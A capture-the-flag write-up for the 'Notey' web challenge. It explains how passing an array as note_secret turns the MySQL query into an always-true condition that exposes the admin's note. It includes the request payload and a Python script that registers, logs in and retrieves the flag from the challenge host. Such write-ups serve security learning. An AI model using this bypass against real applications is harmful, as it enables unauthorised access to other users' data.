
## Notey Writeup

- **Category:** Web
- **Points:** 180
- **Difficulty:** Medium

## Challenge Description

I created a note sharing website for everyone to talk to themselves secretly. Don't try to access others notes, grass isn't greener :'( )

## Challenge Files

You can find the challenge files [here](https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/tree/main/Notey-src)

## Exploitation

The application allows users to create and share notes by assigning a secret password, which enables sharing through the note's ID and password. During an analysis, I discovered that the `viewNote` function does not validate parameter types properly, allowing arrays to be sent instead of text. This vulnerability can be exploited to retrieve the flag from the admin's note (ID 66).

Given that the database is MySQL, an attacker can exploit this vulnerability by sending the following request:
`viewNote?note_id=66&note_secret[username]=admin`

This request translates into the following SQL query:
```sql
SELECT note_id, username, note FROM notes WHERE note_id = '66' AND secret = `username` = 'admin'
```
Which simplifies to:
```sql
SELECT note_id,username,note FROM notes WHERE note_id = '66' and 1
```


The condition secret = 'username' = 'admin' evaluates to 1 because there is a note in the table where username='admin'.

If the username field does not exist, the attack can still be executed by creating a new note with any content, such as 'test', and then retrieving the admin's note using:
`/viewNote?note_id=66&note_secret[note]=test`

Due to server restrictions that invalidate sessions in less than 3 seconds, the exploit is automated using the following script. This script registers a new user, logs in, and retrieves the flag before the session expires:

```python
import requests

# Define the base URL for the application
base_url = 'http://a7c623f98ed8647acdccc.playat.flagyard.com'
login_url = f"{base_url}/login"
register_url = f"{base_url}/register"

# Define user credentials
username = "hanzala"
password = "11223344"

# Data for user registration
register_data = {
    "username": username,
    "password": password
}

# Create a session object to handle cookies and maintain state
sess = requests.Session()

# Register a new user
register_response = sess.post(register_url, data=register_data)
print(f"Register Response: {register_response.status_code}")

# Log in with the newly registered user
login_response = sess.post(login_url, data=register_data)
print(f"Login Response: {login_response.status_code}")

# Define the target URL to exploit the vulnerability
target_url = f"{base_url}/viewNote?note_id=66&note_secret[username]=admin"

# Send the request to exploit the vulnerability and retrieve the flag
exp = sess.get(target_url)
flag = exp.json()[0]['note']
print(f"Flag: {flag}")

